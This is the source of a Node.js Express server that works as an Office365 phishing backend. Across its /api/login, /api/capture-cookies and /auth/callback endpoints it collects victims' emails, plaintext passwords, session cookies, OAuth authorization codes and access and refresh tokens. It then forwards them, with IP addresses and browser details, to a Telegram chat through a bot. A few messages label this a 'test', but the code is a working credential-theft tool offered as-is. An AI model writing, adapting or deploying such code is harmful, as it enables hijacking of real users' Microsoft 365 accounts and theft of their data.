require('dotenv').config();

const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');

const CLIENT_ID = process.env.OFFICE365_CLIENT_ID || 'YOUR_OFFICE365_CLIENT_ID';
const CLIENT_SECRET = process.env.OFFICE365_CLIENT_SECRET || 'YOUR_OFFICE365_CLIENT_SECRET';
const TENANT_ID = process.env.OFFICE365_TENANT_ID || 'YOUR_OFFICE365_TENANT_ID';
const SECRET_ID = process.env.OFFICE365_SECRET_ID || 'YOUR_OFFICE365_SECRET_ID';
const OBJECT_ID = process.env.OFFICE365_OBJECT_ID || 'YOUR_OFFICE365_OBJECT_ID';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

async function sendTelegramMessage(text) {
  try {
    const response = await fetch(TELEGRAM_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown'
      })
    });

    const responseData = await response.json();
    console.log('Telegram send response:', responseData);
    return responseData;
  } catch (sendErr) {
    console.error('Telegram send failed:', sendErr.message);
    throw sendErr;
  }
}

function sanitizeText(value) {
  return String(value || 'n/a').replace(/[_*\[\]()~`>#+-=|{}.!]/g, '');
}

function getRedirectUri(req) {
  const configuredRedirect = process.env.OFFICE365_REDIRECT_URI;
  if (configuredRedirect) {
    return configuredRedirect;
  }

  const forwardedProto = req.headers['x-forwarded-proto'];
  const protocol = forwardedProto ? forwardedProto.split(',')[0].trim() : (req.protocol || 'http');
  const host = req.get('host') || 'localhost:3000';
  return `${protocol}://${host}/auth/callback`;
}

function formatTelegramPayload(code, tokenData, userInfo, cookies, ip, userAgent) {
  const parts = [
    '*Office365 OAuth callback received*',
    `*Valid:* ${sanitizeText(userInfo ? 'Microsoft Valid' : 'unknown')}`,
    `*Email:* ${sanitizeText(userInfo?.mail || userInfo?.userPrincipalName || 'n/a')}`,
    `*Name:* ${sanitizeText(userInfo?.displayName || 'n/a')}`,
    `*Code:* ${sanitizeText(code)}`,
    `*Access Token:* ${sanitizeText(tokenData.access_token)}`,
    `*Refresh Token:* ${sanitizeText(tokenData.refresh_token)}`,
    `*Token Type:* ${sanitizeText(tokenData.token_type)}`,
    `*Expires In:* ${sanitizeText(tokenData.expires_in)}`,
    `*IP:* ${sanitizeText(ip)}`,
    `*User-Agent:* ${sanitizeText(userAgent)}`,
    `*Cookies:* ${sanitizeText(cookies)}`
  ];

  return parts.join('\n');
}

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.send('Office365 server is running.');
});

app.get('/test-telegram', async (req, res) => {
  const message = req.query.msg || 'Telegram test from office365-server.js';
  try {
    const result = await sendTelegramMessage(message);
    res.json({ ok: true, result });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.get('/office365', async (req, res) => {
  const redirectUri = getRedirectUri(req);
  const office365AuthUrl =
    `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?` +
    `client_id=${CLIENT_ID}` +
    `&response_type=code` +
    `&redirect_uri=${encodeURIComponent(redirectUri)}` +
    `&response_mode=query` +
    `&scope=openid profile email offline_access` +
    `&prompt=login`;

  try {
    const ip = req.ip || req.connection.remoteAddress || 'unknown';
    await sendTelegramMessage(`*Office365 login started*\n*Redirect URI:* ${sanitizeText(redirectUri)}\n*IP:* ${sanitizeText(ip)}`);
  } catch (err) {
    console.error('Office365 login notification failed:', err.message);
  }

  return res.redirect(office365AuthUrl);
});

app.post('/api/login', async (req, res) => {
  const { email, password, file, attempt, source, time, browser, country, valid } = req.body;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const browserName = browser || userAgent;
  const clientCountry = country || 'unknown';

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }

  console.log('Login attempt:', {
    email,
    file,
    attempt,
    source,
    time,
    browser: browserName,
    country: clientCountry,
    ip
  });

  const message = `*Microsoft Login Test*\n*Valid:* ${sanitizeText(valid || 'unknown')}\n*Email:* ${sanitizeText(email)}\n*Password:* ${sanitizeText(password)}\n*Browser:* ${sanitizeText(browserName)}\n*IP:* ${sanitizeText(ip)}\n*Country:* ${sanitizeText(clientCountry)}\n*Source:* ${sanitizeText(source)}\n*Attempt:* ${sanitizeText(attempt)}\n*Time:* ${sanitizeText(time)}`;
  await sendTelegramMessage(message);

  res.json({ status: 'ok', message: 'Login data received.' });
});

app.post('/api/capture-cookies', async (req, res) => {
  const payload = req.body || {};
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  const rawBody = JSON.stringify(req.body, null, 2);
  let cookiesText = '';
  if (payload.cookies) {
    cookiesText = typeof payload.cookies === 'string'
      ? payload.cookies
      : JSON.stringify(payload.cookies);
  } else if (payload.cookieArray) {
    cookiesText = JSON.stringify(payload.cookieArray);
  } else if (Array.isArray(payload)) {
    cookiesText = JSON.stringify(payload);
  }

  const valid = payload.valid || 'unknown';
  const email = payload.email || payload.userEmail || 'n/a';
  const name = payload.name || payload.displayName || 'n/a';
  const code = payload.code || 'n/a';
  const accessToken = payload.access_token || payload.accessToken || 'n/a';
  const refreshToken = payload.refresh_token || payload.refreshToken || 'n/a';
  const country = payload.country || 'unknown';
  const browserName = payload.browser || userAgent;

  const message = `*Cookie capture test*\n*Valid:* ${sanitizeText(valid)}\n*Email:* ${sanitizeText(email)}\n*Name:* ${sanitizeText(name)}\n*Code:* ${sanitizeText(code)}\n*Access Token:* ${sanitizeText(accessToken)}\n*Refresh Token:* ${sanitizeText(refreshToken)}\n*IP:* ${sanitizeText(ip)}\n*User-Agent:* ${sanitizeText(userAgent)}\n*Browser:* ${sanitizeText(browserName)}\n*Country:* ${sanitizeText(country)}\n\n*Raw payload:*\n${sanitizeText(rawBody)}\n\n*Cookies:*\n${sanitizeText(cookiesText)}`;

  try {
    await sendTelegramMessage(message);
    res.json({ status: 'ok', message: 'Cookie payload received.' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to forward cookie payload.', details: err.message });
  }
});

app.get('/auth/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) {
    return res.status(400).send('Missing code parameter.');
  }

  const redirectUri = getRedirectUri(req);
  const rawCookies = req.headers.cookie || 'none';
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  try {
    const tokenResponse = await fetch(
      `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: CLIENT_ID,
          client_secret: CLIENT_SECRET,
          code: code,
          redirect_uri: redirectUri,
          grant_type: 'authorization_code'
        })
      }
    );

    const tokenData = await tokenResponse.json();
    if (!tokenData.access_token) {
      await sendTelegramMessage(`*Office365 OAuth token exchange failed*\n*Code:* ${sanitizeText(code)}\n*Cookies:* ${sanitizeText(rawCookies)}\n*Error:* ${sanitizeText(JSON.stringify(tokenData))}`);
      return res.status(500).json({ error: 'Token exchange failed', details: tokenData });
    }

    const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
      headers: {
        Authorization: `Bearer ${tokenData.access_token}`
      }
    });
    const userInfo = await userResponse.json();

    const telegramText = formatTelegramPayload(code, tokenData, userInfo, rawCookies, ip, userAgent);
    await sendTelegramMessage(telegramText);

    res.cookie('office365_access_token', tokenData.access_token, {
      httpOnly: true,
      secure: false,
      sameSite: 'Lax'
    });

    return res.json({ message: 'OAuth callback received', tokenData, cookies: rawCookies });
  } catch (err) {
    await sendTelegramMessage(`*Office365 OAuth callback error*\n*Code:* ${sanitizeText(code)}\n*Cookies:* ${sanitizeText(rawCookies)}\n*Error:* ${sanitizeText(err.message)}`);
    return res.status(500).json({ error: 'Callback error', details: err.message });
  }
});

const port = process.env.PORT || 3000;

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
